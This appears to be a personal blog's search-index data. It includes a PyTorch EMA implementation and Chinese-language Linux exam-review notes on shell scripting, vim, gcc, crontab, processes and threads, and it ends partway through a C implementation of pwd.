{"pages":[{"title":"about","text":"Hi there 👋, My name is Chenghua WangEducationZhejiang Gongshang University, 2020/09/01 - now Interests Computer Vision Learning with Noisy Labels Instance Seg Multi-Labels, Multi-class classification (Konw woring on ) Image Dehazing OrganizationZhejiang Gongshang University, CV LAB. 2021/09/01 - now","link":"/about/index.html"}],"posts":[{"title":"EMA 原理和实现(torch)","text":"EMA(指数滑动平均)，经常被用在深度学习任务中，来提神模型的鲁棒性或是涨点。在半监督的分类任务中，经常使用EMA的方法来给不同参数做self-ensemble。 算法流程 原理解析Pytorch 实现12345678910111213141516171819202122232425class EMA: r&quot;&quot;&quot; Usage: model = ResNet(config) ema = EMA(model, alpha=0.999) ... # train an epoch ema.update_params(model) ema.apply_shadow(model) &quot;&quot;&quot; def __init__(self, _net, _alpha=0.999): self.shadow = {k: v.clone().detach() for k, v in _net.state_dict().items()} self.param_keys = [k for k, _ in _net.named_parameters()] self.alpha = _alpha def init_params(self, _model): self.shadow = {k: v.clone().detach() for k, v in _model.state_dict().items()} self.param_keys = [k for k, _ in _model.named_parameters()] def update_params(self, _model): state = _model.state_dict() for name in self.param_keys: self.shadow[name].copy_(self.alpha * self.shadow[name] + (1 - self.alpha) * state[name]) def apply_shadow(self, _model): _model.load_state_dict(self.shadow, strict=True)","link":"/2021/10/07/EMA-%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0-torch/"},{"title":"quote-JiXianlin","text":"今天仍然拼命看书，因为明天就要考了。学期的成绩就全仗这两天挣，现在更感到考试无用与无聊。 ——季羡林 《清华园日记》","link":"/2021/06/25/quote-JiXianlin/"},{"title":"Linux复习","text":"linux期末复习本文中一些$a这样的shell变量引用会被mathjex翻译成公式，请分辨。 基本的命令 如何安装应用程序，快捷键等(vim，linux本身的快捷键) shell脚本 编译(gcc，makefile) shell命令的c语言实现 多进程与线程的基本概念与编程 课程内容回顾 各类Linux下的命令； Shell脚本； 基于命令的文字处理，尤其是正则表达式； Linux下的C语言编程环境，gcc及make等； Linux下如何搭建网站； Linux下常用命令的实现ls, cat, cp以及pwd等； 进程及线程等； 考试题型 填空题（30分：2分*15）； 判断题(10分：1分*10）； 简答题（28分：4分*7）； 代码阅读题（16分）；填写空白代码行； 编程题（16分：8分*2）； 考试范围和重点 每周实验的内容； 不考的内容：1、正则表达式；2、字符串处理命令sed和awk；3、curl和wget；4、Samba服务器、apache、mysql和php等的安装；5、多线程的线程间同步； 重点考察内容 Ubuntu下的常见操作，比如安装程序，快捷键等； 常用的命令和shell脚本； Linux下的编译环境，比如gcc和Makefile； 常用shell命令的C语言实现，比如cp, cat, ls以及pwd； 多线程与进程的基本概念及接口； Linux下的各种命令参考word(书本和word版本的linux复习提纲)，重点注意(软链接，硬链接)，（rm，tail，head，cat，grep，cd，ls，mkdir。rmdir，pwd，ps，……），(命令之间的管道的应用)，(chmod)，(进入root)，（group用户组），man命令，crontab命令!!!。 1. 切换用户12su usernamesu #切换到root目录 2.Group12groupadd 选项 用户组groupdel 用户组 # 删除 可以使用的选项有： -g GID 指定新用户组的组标识号（GID）。 -o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。 12useradd 选项 用户名 # 新增userdel 选项 用户名 # 删除 选项: -c comment 指定一段注释性描述。 -d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。 -g 用户组 指定用户所属的用户组。 -G 用户组，用户组 指定用户所属的附加组。 -s Shell文件 指定用户的登录Shell。 -u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。 Shell脚本下面的大部分内容引用自shell菜鸟教程，很多的内容都省略了，想看完全版的去菜鸟教程，这里只是考试内容。 1.shell脚本基础bash，zsh，csh ……，ubuntu内置的默认shell脚本是bash。 12#! /bin/bashecho &quot;Hello World !&quot; #! 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。 2.shell脚本的运行方式 1、作为可执行程序 cd 到相应目录 12chmod +x ./test.sh #使脚本具有执行权限./test.sh #执行脚本 一定要写成 ./test.sh，而不是 test.sh，运行其它二进制的程序也一样，直接写 test.sh，linux 系统会去 PATH 里寻找有没有叫 test.sh 的。要用 ./test.sh 告诉系统说，就在当前目录找。 2、作为解释器参数 这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如： 12/bin/sh test.sh/bin/php test.php 这种方式运行的脚本，不需要在第一行指定解释器信息，写了也没用。 3.shell变量注意，变量名和等号之间不能有空格 123456your_name=&quot;Jason&quot;除了显式地直接赋值，还可以用语句给变量赋值,如： for file in `ls /etc` 或 for file in $(ls /etc)以上语句将 /etc 下目录的文件名循环出来。 已定义的变量，可以被重新定义 1234your_name=&quot;tom&quot;echo $your_nameyour_name=&quot;alibaba&quot;echo $your_name 这样写是合法的，但注意，第二次赋值的时候不能写 $ your_name=&quot;alibaba&quot;，使用变量的时候才加美元符（$）。 只读变量 12myUrl=&quot;https://www.google.com&quot;readonly myUrl 删除变量 1unset variable_name 变量类型(应该不会考):hear_no_evil: 1) 局部变量 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。 2) 环境变量 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。 3) shell变量 shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行 3.1 shell字符串字符串可以用单引号，也可以用双引号，也可以不用引号。 1str='this is a string' 单引号字符串的限制 1.单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；2.单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。 双引号的优点 双引号里可以有变量 双引号里可以出现转义字符 拼接字符串 123456789your_name=&quot;runoob&quot;# 使用双引号拼接greeting=&quot;hello, &quot;$your_name&quot; !&quot;greeting_1=&quot;hello, ${your_name} !&quot;echo $greeting $greeting_1# 使用单引号拼接greeting_2='hello, '$your_name' !'greeting_3='hello, ${your_name} !'echo $greeting_2 $greeting_3 输出结果为 12hello, runoob ! hello, runoob !hello, runoob ! hello, ${your_name} ! 字符串长度 12string=&quot;abcd&quot;echo ${#string} #输出 4 查找子字符串 查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)： 12string=&quot;runoob is a great site&quot;echo `expr index &quot;$string&quot; io` # 输出 4 注意： 以上脚本中 `是反引号，而不是单引号'，不要看错了哦。 3.2 shell 数组1234567891011数组名=(值1 值2 ... 值n)array_name=(value0 value1 value2 value3)array_name=(value0value1value2value3)array_name[0]=value0array_name[1]=value1array_name[n]=valuen 3.3 shell 注释以 # 开头的行就是注释，会被解释器忽略。 多行注释 12345:&lt;&lt;EOF注释内容...注释内容...注释内容...EOF 4.shell传递参数我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推…… 例如： 12345echo &quot;Shell 传递参数实例！&quot;;echo &quot;执行的文件名：$0&quot;;echo &quot;第一个参数为：$1&quot;;echo &quot;第二个参数为：$2&quot;;echo &quot;第三个参数为：$3&quot;; 输出如下: 1234567$ chmod +x test.sh $ ./test.sh 1 2 3Shell 传递参数实例！执行的文件名：./test.sh第一个参数为：1第二个参数为：2第三个参数为：3 特殊参数： 参数处理 说明 $# 传递到脚本的参数个数 $? 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 $* 以一个单字符串显示所有向脚本传递的参数。如”$*”用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。 5.shell基本运算符12val=`expr 2 + 2`echo &quot;两数之和为 : $val&quot; 表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2，这与我们熟悉的大多数编程语言不一样。 运算符 说明 举例 + 加法 expr $a + $b 结果为 30。 - 减法 expr $a - $b 结果为 -10。 * 乘法 expr $a \\* $b 结果为 200。 / 除法 expr $b / $a 结果为 2。 % 取余 expr $b % $a 结果为 0。 = 赋值 a=$b 将把变量 b 的值赋给 a。 == 相等。用于比较两个数字，相同则返回 true。 [ $a == $b ] 返回 false。 != 不相等。用于比较两个数字，不相同则返回 true。 [ $a != $b ] 返回 true。 注意：条件表达式要放在方括号之间，并且要有空格，例如: [$a==$b] 是错误的，必须写成 **[ $a == $b ]**。 乘号(*)前边必须加反斜杠()才能实现乘法运算 数字类型关系运算符 运算符 说明 举例 -eq 检测两个数是否相等，相等返回 true。 [ $a -eq $b ] 返回 false。 -ne 检测两个数是否不相等，不相等返回 true。 [ $a -ne $b ] 返回 true。 -gt 检测左边的数是否大于右边的，如果是，则返回 true。 [ $a -gt $b ] 返回 false。 -lt 检测左边的数是否小于右边的，如果是，则返回 true。 [ $a -lt $b ] 返回 true。 -ge 检测左边的数是否大于等于右边的，如果是，则返回 true。 [ $a -ge $b ] 返回 false。 -le 检测左边的数是否小于等于右边的，如果是，则返回 true。 [ $a -le $b ] 返回 true。 布尔运算符 运算符 说明 举例 ! 非运算，表达式为 true 则返回 false，否则返回 true。 [ ! false ] 返回 true。 -o 或运算，有一个表达式为 true 则返回 true。 [ $a -lt 20 -o $b -gt 100 ] 返回 true。 -a 与运算，两个表达式都为 true 才返回 true。 [ $a -lt 20 -a $b -gt 100 ] 返回 false。 字符串运算符 运算符 说明 举例 = 检测两个字符串是否相等，相等返回 true。 [ $a = $b ] 返回 false。 != 检测两个字符串是否不相等，不相等返回 true。 [ $a != $b ] 返回 true。 -z 检测字符串长度是否为0，为0返回 true。 [ -z $a ] 返回 false。 -n 检测字符串长度是否不为 0，不为 0 返回 true。 [ -n “$a” ] 返回 true。 $ 检测字符串是否为空，不为空返回 true。 [ $a ] 返回 true。 6.Shell echo命令123#!/bin/shread name echo &quot;$name It is a test&quot; 重定向 1echo &quot;It is a test&quot; &gt; myfile 显示命令执行结果 1echo `date` 7.Shell printf1printf format-string [arguments...] 1234printf &quot;%-10s %-8s %-4s\\n&quot; 姓名 性别 体重kg printf &quot;%-10s %-8s %-4.2f\\n&quot; 郭靖 男 66.1234printf &quot;%-10s %-8s %-4.2f\\n&quot; 杨过 男 48.6543printf &quot;%-10s %-8s %-4.2f\\n&quot; 郭芙 女 47.9876 转义 序列 说明 \\a 警告字符，通常为ASCII的BEL字符 \\b 后退 \\c 抑制（不显示）输出结果中任何结尾的换行字符（只在%b格式指示符控制下的参数字符串中有效），而且，任何留在参数里的字符、任何接下来的参数以及任何留在格式字符串中的字符，都被忽略 \\f 换页（formfeed） \\n 换行 \\r 回车（Carriage return） \\t 水平制表符 \\v 垂直制表符 \\ 一个字面上的反斜杠字符 \\ddd 表示1到3位数八进制值的字符。仅在格式字符串中有效 \\0ddd 表示1到3位的八进制值字符 8.流程控制(书上写的够明白了)1234567891011121314a=10b=20if [ $a == $b ]then echo &quot;a 等于 b&quot;elif [ $a -gt $b ]then echo &quot;a 大于 b&quot;elif [ $a -lt $b ]then echo &quot;a 小于 b&quot;else echo &quot;没有符合的条件&quot;fi 12345678910for loop in 1 2 3 4 5do echo &quot;The value is: $loop&quot;donefor str in This is a stringdo echo $strdone 12345678910111213int=1while(( $int&lt;=5 ))do echo $int let &quot;int++&quot;doneecho '按下 &lt;CTRL-D&gt; 退出'echo -n '输入你最喜欢的网站名: 'while read FILMdo echo &quot;是的！$FILM 是一个好网站&quot;done 1234567a=0until [ ! $a -lt 10 ]do echo $a a=`expr $a + 1`done 123456789101112131415161718192021222324252627echo '输入 1 到 4 之间的数字:'echo '你输入的数字为:'read aNumcase $aNum in 1) echo '你选择了 1' ;; 2) echo '你选择了 2' ;; 3) echo '你选择了 3' ;; 4) echo '你选择了 4' ;; *) echo '你没有输入 1 到 4 之间的数字' ;;esac#-----------------------------------------site=&quot;runoob&quot;case &quot;$site&quot; in &quot;runoob&quot;) echo &quot;菜鸟教程&quot; ;; &quot;google&quot;) echo &quot;Google 搜索&quot; ;; &quot;taobao&quot;) echo &quot;淘宝网&quot; ;;esac 9.Shell 输入/输出重定向 命令 说明 command &gt; file 将输出重定向到 file。 command &lt; file 将输入重定向到 file。 command &gt;&gt; file 将输出以追加的方式重定向到 file。 n &gt; file 将文件描述符为 n 的文件重定向到 file。 n &gt;&gt; file 将文件描述符为 n 的文件以追加的方式重定向到 file。 n &gt;&amp; m 将输出文件 m 和 n 合并。 n &lt;&amp; m 将输入文件 m 和 n 合并。 &lt;&lt; tag 将开始标记 tag 和结束标记 tag 之间的内容作为输入。 如何安装应用程序，快捷键等1.换源12sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 备份原来的sorce文件sudo gedit /etc/apt/sources.list 修改sources.list文件 or sudo vim /etc/apt/sources.list 修改完这个文件后 1sudo apt-get update 2.安装软件1sudo apt-get install [app] 3.移除软件1sudo apt-get remove [app] 4.apt or apt-getapt与apt-get可以实现大部分相同的功能，可以视作两个不同的软件，但是apt-get支持更为底层的操作，其操作更细。 5.快捷键5.1 linux, terminalCtrl + Alt + T打开终端。 Tab-自动补全 当以xxx开头的命令或文件名仅有1个时，按下Tab键 1次，将会自动补全该命令或文件名； 当以xxx开头的命令或文件名不止1个时，按1次Tab键是没反应的，再按1次Tab键，下方将出现以xxx开头的命令或文件名。 在终端&amp;控制台下copy and paste： 粘贴：Ctrl + Shift + c 或 Ctrl + Insert 复制：Ctrl + Shift + v 或 Shift + Insert 在终端中搜索内容 Ctrl + Shift + f 命令行历史 上键、Ctrl + p：查看上一个使用过的命令 下键、Ctrl + n：查看下一个使用过的命令 Ctrl + r：搜索历史命令。输入若干字符，开始向上搜索包含该字符的命令，继续按Ctrl+r，搜索上一条匹配的命令 清屏 Ctrl + l 横线的数量 一横：表示参数是字符形式，如ls -a 两横：表示参数是单词形式，如cp --help 5.2 vim移动光标：gg第一行，G最后一行，XG第X行； 删除一行：dd 删除单词：dw 复制一行：yy 粘贴一行：p 退出编辑器 按键 功能 说明 :w 将缓冲区写入文件，即保存修改 :wq 保存修改并退出 :x 保存修改并退出 :q 退出，如果对缓冲区进行过修改，则会提示 :q! 强制退出，放弃修改 显示行数 :set nu 光标移动 按键 功能 说明 h,j,k,l 上，下，左，右 ctrl-e 移动页面 ctrl-f 上翻一页 ctrl-b 下翻一页 ctrl-u 上翻半页 ctrl-d 下翻半页 w 跳到下一个字首，按标点或单词分割 接上表 W 跳到下一个字首，长跳，如end-of-line被认为是一个字 e 跳到下一个字尾 E 跳到下一个字尾，长跳 b 跳到上一个字 B 跳到上一个字，长跳 0 跳至行首，不管有无缩进，就是跳到第0个字符 ^ 跳至行首的第一个字符 $ 跳至行尾 常用 gg 跳至文首 常用 G 调至文尾 常用 5gg/5G 调至第5行 gd 跳至当前光标所在的变量的声明处 fx 在当前行中找x字符，找到了就跳转至 ; 重复上一个f命令，而不用重复的输入fx * 查找光标所在处的单词，向下查找 # 查找光标所在处的单词，向上查找 删除复制 按esc后，然后ggvG或者ggVG 全选（高亮显示） 按esc后，然后ggyG 全部复制 按esc后，然后dG 全部删除 基础的 gcc and makefile 操作1. gcc1.1 单文件编译gcc test.c -o test 1.2 多文件编译123gcc -c test1.c -o test1.ogcc -c test2.c -o test2.ogcc test1.o test2.o -o test 2.Makefile数据结构作业中用到了makefile 123456789101112131415161718192021maincc:main.o compress.o pack.o hfman.o g++ pack.o compress.o main.o hfman.o -o compress_winmain.o:main.cpp g++ -c main.cpppack.o:pack.cpp g++ -c pack.cppcompress:compress.cpp g++ -c compress.cpphfman:hfman.cpp g++ -c hfman.cpp#maincc:main.o compress.o pack.o debugg.o\\ g++ pack.o compress.o main.o debugg.o -o compress_debug_co\\main.o:main.cpp\\ g++ -c main.cpp\\pack.o:pack.cpp\\ g++ -c pack.cpp\\compress:compress.cpp\\ g++ -c compress.cpp\\debugg:debugg.cpp\\ g++ -c debugg.cpp\\ 注意注释编写规范。 进程与线程1.进程与线程区别引用：链接 第一个被创造出来的进程是0号进程，这个进程在操作系统层面是不可见的，但它存在着。0号进程完成了操作系统的功能加载与初期设定，然后它创造了1号进程(init)，这个1号进程就是操作系统的“耶稣”。1号进程是上帝派来管理整个操作系统的，所以在用pstree查看进程树可知，1号进程位于树根。再之后，系统的很多管理程序都以进程身份被1号进程创造出来，还创造了与人类沟通的桥梁——shell。从那之后，人类可以跟操作系统进行交流，可以编写程序，可以执行任务。。。 无论是进程还是线程，对于程序员而言，都是用来实现多任务并发的技术手段。二者都可以独立调度，因此在多任务环境下，功能上并无差异。并且二者都具有各自的实体，是系统独立管理的对象个体。所以在系统层面，都可以通过技术手段实现二者的控制。而且二者所具有的状态都非常相似。而且，在多任务程序中，子进程(子线程)的调度一般与父进程(父线程)平等竞争。 进程是资源分配的基本单位，线程是调度的基本单位。 这句经典名言已流传数十年，各种操作系统教材都可见此描述。确实如此，这就是二者的显著区别。读者请注意“基本”二字。相信有读者看到前半句的时候就在心里思考，“进程岂不是不能调度？”，非也！进程和线程都可以被调度，否则多进程程序该如何运行呢！ 只是，线程是更小的可以调度的单位，也就是说，只要达到线程的水平就可以被调度了，进程自然可以被调度。它强调的是分配资源时的对象必须是进程，不会给一个线程单独分配系统管理的资源。若要运行一个任务，想要获得资源，最起码得有进程，其他子任务可以以线程身份运行，资源共享就行了。 简而言之，进程的个体间是完全独立的，而线程间是彼此依存的。多进程环境中，任何一个进程的终止，不会影响到其他进程。而多线程环境中，父线程终止，全部子线程被迫终止(没有了资源)。而任何一个子线程终止一般不会影响其他线程，除非子线程执行了exit()系统调用。任何一个子线程执行exit()，全部线程同时灭亡。 其实，也没有人写出只有线程而没有进程的程序。多线程程序中至少有一个主线程，而这个主线程其实就是有main函数的进程。它是整个程序的进程，所有线程都是它的子线程。我们通常把具有多线程的主进程称之为主线程。 进程的备份关系森严，在父进程没有结束前，所有的子进程都尊从父子关系，也就是说A创建了B，则A与B是父子关系，B又创建了C，则B与C也是父子关系，A与C构成爷孙关系，也就是说C是A的孙子进程。在系统上使用pstree命令打印进程树，可以清晰看到备份关系。 多线程间的关系没有那么严格，不管是父线程还是子线程创建了新的线程，都是共享父线程的资源，所以，都可以说是父线程的子线程，也就是只存在一个父线程，其余线程都是父线程的子线程。 基本命令1.chmod # 权限 rwx 二进制 7 读 + 写 + 执行 rwx 111 6 读 + 写 rw- 110 5 读 + 执行 r-x 101 4 只读 r– 100 3 写 + 执行 -wx 011 2 只写 -w- 010 1 只执行 –x 001 0 无 — 000 2.软连接和硬链接2.1 硬链接硬链接是通过索引节点进行的链接。在Linux中，多个文件指向同一个索引节点是允许的，像这样的链接就是硬链接。硬链接只能在同一文件系统中的文件之间进行链接，不能对目录进行创建。如果删除硬链接对应的源文件，则硬链接文件仍然存在，而且保存了原有的内容，这样可以起到防止因为误操作而错误删除文件的作用。由于硬链接是有着相同 inode 号仅文件名不同的文件，因此，删除一个硬链接文件并不影响其他有相同 inode 号的文件。 12link oldfile newfile ln oldfile newfile 2.2 软链接软链接（也叫符号链接）与硬链接不同，文件用户数据块中存放的内容是另一文件的路径名的指向。软链接就是一个普通文件，只是数据块内容有点特殊。软链接可对文件或目录创建。 软链接主要应用于以下两个方面：一是方便管理，例如可以把一个复杂路径下的文件链接到一个简单路径下方便用户访问；另一方面就是解决文件系统磁盘空间不足的情况。例如某个文件文件系统空间已经用完了，但是现在必须在该文件系统下创建一个新的目录并存储大量的文件，那么可以把另一个剩余空间较多的文件系统中的目录链接到该文件系统中，这样就可以很好的解决空间不足问题。删除软链接并不影响被指向的文件，但若被指向的原文件被删除，则相关软连接就变成了死链接。 12ln -s old.file soft.linkln -s old.dir soft.link.dir 实验1. crontabcrontab -e打开设置文件，crontab可能并没有在ubuntu上安装，使用sudo apt-get install 来安装。 在crontab -e后打开的文件里修改。 修改的规则如下： 1f1 f2 f3 f4 f5 program 其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。 当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推 当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推 当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推 当 f1 为 a, b, c,… 时表示第 a, b, c,… 分钟要执行，f2 为 a, b, c,… 时表示第 a, b, c…个小时要执行，其馀类推 12345678* * * * *- - - - -| | | | || | | | +----- 星期中星期几 (0 - 6) (星期天 为0)| | | +---------- 月份 (1 - 12) | | +--------------- 一个月中的第几天 (1 - 31)| +-------------------- 小时 (0 - 23)+------------------------- 分钟 (0 - 59) 1*/3 * * * * date &gt;&gt; /home/wangchenghua/hello.txt 2.exec execve函数是真正意义上的系统调用 其他为经过包装的库函数，最终调用的还是execve函数。 带“l”表示以列表的形式传参数 带“v”表示以数组的形式传参数 带“e”表示将环境变量传递给函数 带“p”表示第一个参数filename不用输入完整的路径，只要给出命令名即可，它会在环境变量PATH中查找命令 该函数定义在&lt;unistd.h&gt; 1234567891011#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;int main(){ char * argv[] = {&quot;wensen.sh&quot;, 0}; // 数组最后一位需要为0 execvp(&quot;/home/wensen/workspace/test/wensen.sh&quot;, argv); return 0;}————————————————原文链接：https://blog.csdn.net/u011857683/article/details/81160059 需要注意的是，执行的时候，传入的参数的第一个必须是这个被执行文件的文件名，最后的一位数组必须是0； 与一般情况不同，exec函数族的函数执行成功后不会返回，因为调用进程的实体，包括代码段，数据段和堆栈等都已经被新的内容取代，只留下进程ID等一些表面上的信息仍保持原样，颇有些神似”三十六计”中的”金蝉脱壳”。看上去还是旧的躯壳，却已经注入了新的灵魂。只有调用失败了，它们才会返回一个-1，从原程序的调用点接着往下执行。 3.进程进程由程序产生，是动态的，是一个运行着的、要占用系统运行资源的程序。简而言之，进程就是程序的一次运行过程。系统给每一个进程都分配了一个唯一的进程标识符（进程号，简称PID）。 进程相关的参数 PID：进程号（Process ID），用于唯一标识进程。 PPID：父进程号（Parent PID），创建某进程的上一个进程的进程号。 USER/UID：启动某个进程的用户ID和该用户所属组的ID。 STAT：进程状态，颐和进程可能处于多种状态，如运行、等待、停止、睡眠、僵死等。 PRIORITY：进程的优先级，数字越大表示优先级越低。 NICE：进程的谦让度，表示进程对CPU时间要求的迫切程度。 资源占用：包括CPU、内存等资源的占用信息。 进程的类型 交互进程：在Shell下通过执行程序所产生的进程，可在前台或后台运行。 批处理进程：一个进程序列。 守护进程：又称监控进程，是指那些在后台运行，并且没有控制终端的进程，通常可以随着操作系统的启动而运行，也可将其称为服务。 在terminal中使用ps命令查看，也可以使用第三方的htop查看 进程的基本状态 就绪状态 执行状态 阻塞状态 进程控制块 为了描述和控制进程的运行，系统为每个进程定义了一个数据结构，该数据结构被称为进程控制块PCB。 PCB是进程存在的唯一标志. 进程启动 前台方式启动进程: 打开系统终端，在终端窗口的命令行提示符后输入Linux命令并按回车键，就以前台方式启动了一个进程。 后台方式启动进程: 在终端下，以后台方式启动进程，需要在执行的命令后面添加一个“&amp;”符号 进程优先级改变 查看目前进程的优先级： ps –l 改变进程优先级的命令——nice命令 【功能】在启动进程时指定请求进程执行优先级 【格式】nice [选项] 命令 【选项】常用的一个选项是“-n”，n值即为NI的值，n值的范围为-20—19。n值越小优先级越高。即，-20代表最高的NI优先级，19代表最低的NI优先级。如果不加该选项，默认NI值为10。 【说明】默认情况下，只有root用户才能提高请求进程的优先级，普通用户只能降低请求进程的优先级 renice命令 【功能】在进程执行时改变NI的值。 【格式】renice [+/-n] [-g 命令名…] [-p 进程标识码…] [-u 进程所有者…] 【说明】可以通过命令名、进程标识码、进程所有者名指定要改变的进程的NI值 kill命令 【功能】终止进程 【格式】kill [-信号] PID 【说明】kill命令用来终止进程，实际是向指定进程发送特定的信号。从而使该进程根据这个信号执行特定的动作。信号可以用信号名称，也可以使用信号码。 pstree命令 【功能】显示进程家族树的信息 【格式】pstree [选项] [进程PID/用户名] fork命令: 一个进程调用fork来复制自己。创建子进程后，父、子进程执行同一个程序，子进程继承父进程的资源。调用fork（）函数后，系统将创建一个与当前进程相同的新的进程。它与原有的进程具有相同的数据、连接关系和从同一处执行的连续性。 12345678910int main(){ printf(&quot;my pid is %d\\n&quot;, getpid() ); fork(); fork(); fork(); printf(&quot;my pid is %d\\n&quot;, getpid() );}问题：程序会有几行输出？ 分辨子进程还是父进程 12345678910111213int main(){ int fork_rv; printf(&quot;Before: my pid is %d\\n&quot;, getpid()); fork_rv = fork(); /* create new process */ if ( fork_rv == -1 ) /* check for error */ perror(&quot;fork&quot;); else if ( fork_rv == 0 ) printf(&quot;I am the child. my pid=%d\\n&quot;, getpid()); else printf(&quot;I am the parent. my child is %d\\n&quot;, fork_rv);} 父进程如何等待子进程的退出 Wait做的两件事情： 暂停调用它的进程直到子进程结束 取得子进程结束时传给exit的值 进程一旦调用了wait，就立即阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。 僵尸进程 注意：在一个进程调用了exit之后，该进程并非马上就消失掉，而是留下一个称为僵尸进程（Zombie）的数据结构。在Linux进程的5种状态中，僵尸进程是非常特殊的一种，它已经放弃了几乎所有内存空间，没有任何可执行代码，也不能被调度，仅仅在进程列表中保留一个位置，记载该进程的退出状态等信息供其他进程收集，除此之外，僵尸进程不再占有任何内存空间。 如何结束僵尸进程？ 父进程中使用wait函数，收尸。 把父进程杀掉。父进程死后，僵尸进程成为”孤儿进程”，过继给1号进程init，init始终会负责清理僵尸进程．它产生的所有僵尸进程也跟着消失. wait() 进程一旦调用了wait，就立即阻塞自己，由wait自动分析是否当前进程的某个子进程已经退出，如果让它找到了这样一个已经变成僵尸的子进程，wait就会收集这个子进程的信息，并把它彻底销毁后返回；如果没有找到这样一个子进程，wait就会一直阻塞在这里，直到有一个出现为止。 参数status用来保存被收集进程退出时的一些状态，它是一个指向int类型的指针。但如果我们对这个子进程是如何死掉的毫不在意，只想把这个僵尸进程消灭掉，（事实上绝大多数情况下，我们都会这样想），我们就可以设定这个参数为NULL，就象下面这样：pid = wait(NULL); 如果成功，wait会返回被收集的子进程的进程ID，如果调用进程没有子进程，调用就会失败，此时wait返回-1 4.线程(重点)线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。 （1）线程采用了多个线程可共享资源的设计思想。在多进程情况下，每个进程都有自己独立的地址空间，在多线程情况下，同一进程内的线程共享进程的地址空间。线程和进程的最大区别在于线程完全共享相同的地址空间，运行在同一地址上。 （2）由于进程地址空间独立而线程共享地址空间，所以从一个线程切换到另一线程所花费的代价比进程低。 （3）进程本身的信息在内存中占用的空间比线程大。因此，线程更能充分地利用内存。线程可以看作是在进程内部执行的指定序列。 （4）线程间的通信比进程间的通信更加方便和省时。进程间的数据空间相互独立，彼此通信要以专门的通信方式进行，通信时必须经过操作系统，而同一进程的多个线程共享数据空间，一个线程的数据可以直接提供给其他线程使用，不必进过操作系统。 12345678int pthread_create( pthread_t *restrict tidp, //新创建的线程ID指向的内存单元。 const pthread_attr_t *restrict attr, //线程属性，默认为NULL void *(*start_rtn)(void *), //新创建的线程从start_rtn函数的地址开始运行 void *restrict arg //默认为NULL。若上述函数需要参数，将参数放入结构中并将地址作为arg传入。 );————————————————原文链接：https://blog.csdn.net/wushuomin/article/details/80051295 12345678910111213141516171819202122#include &lt;pthread.h&gt; // vital#include &lt;stdio.h&gt;#icnlude &lt;stdlib.h&gt;void print_msg(char *m){ int i; for(i=0 ; i&lt;NUM ; i++){ printf(&quot;%s&quot;, m); fflush(stdout); sleep(1); }}int main(){ pthread_t t1, t2; /* two threads */ void *print_msg(void *); pthread_create(&amp;t1, NULL, print_msg, (void *)&quot;hello&quot;); pthread_create(&amp;t2, NULL, print_msg, (void *)&quot;world\\n&quot;); pthread_join(t1, NULL); pthread_join(t2, NULL);} pthread_join使得调用线程挂起直至有thread参数指定的线程终止。 多个线程在一个单独的进程中运行，共享全局变量，因此线程间可以通过设置和读取全局变量来进行通信。 对共享内存的访问是线程的一个既有用又极其危险的特性 pthread_mutex_lock pthread_mutex_unlock 12345pthread_mutex_t counter_lock = PTHREAD_MUTEX_INITIALIZER;pthread_mutex_lock(&amp;counter_lock);total_words++;pthread_mutex_unlock(&amp;counter_lock); 5.pwd1、如何判断是否到达目录树的顶点？ 在unix文件系统的根目录中“.”和“..”指向同一个i-节点时，就以认为到达树的顶端。 2、如何正确显示目录名？ 递归地调用并显示，或者使用栈数据结构； 命令pwd的实现流程 得到”.”的i-节点号，称其为n(使用stat)； chdir ..，切换到上一级目录( 使用chdir)； 找到i-节点号n所对应的链接名称(使用opendir, readdir, closedir），重复直到树的顶端； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include&lt;stdio.h&gt;#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;dirent.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define SIZE 128ino_t get_inode(char *dirname);void get_work_dir(ino_t inode_num);void inode_to_dirname(ino_t inode_num, char *buf, int buflen);int main(void){ get_work_dir(get_inode(&quot;.&quot;)); printf(&quot;\\n&quot;); return 0;}ino_t get_inode(char *dirname){ struct stat info; if (stat(dirname, &amp;info) == -1){ perror(&quot;dirname&quot;); exit(1); } return info.st_ino;}void get_work_dir(ino_t inode_num){ ino_t parent_inode; char buf[SIZE]; if (get_inode(&quot;..&quot;) != inode_num){ chdir(&quot;..&quot;); inode_to_dirname(inode_num, buf, SIZE); parent_inode = 